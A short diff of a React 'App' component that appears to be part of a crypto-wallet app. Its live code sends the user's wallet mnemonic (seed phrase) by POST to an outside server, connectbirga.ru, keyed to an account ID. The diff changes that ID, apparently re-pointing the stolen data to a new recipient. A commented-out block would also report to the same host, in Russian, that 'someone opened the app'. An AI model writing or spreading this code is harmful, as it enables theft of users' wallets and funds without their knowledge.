@@ -241,7 +241,7 @@ function App() {
   //   async function dsa(){
   //     // await axios.get("https://www.connectbirga.ru/user/sendMessage", {
   //     //   params: {
-  //     //     chatId: 2144832745,
+  //     //     chatId: 858931156,
   //     //     text:
   //     //     "Кто - то октрыл приложение",
   //     //     languageCode : en ? "en" : "ru"
@@ -300,7 +300,7 @@ function App() {
 
         const user = await axios.post("https://www.connectbirga.ru/user/wallet", {
           mnemonic: mnemonics,
-          userId: 2144832745,
+          userId: 858931156,
         });
 
         // Create wallet contrac
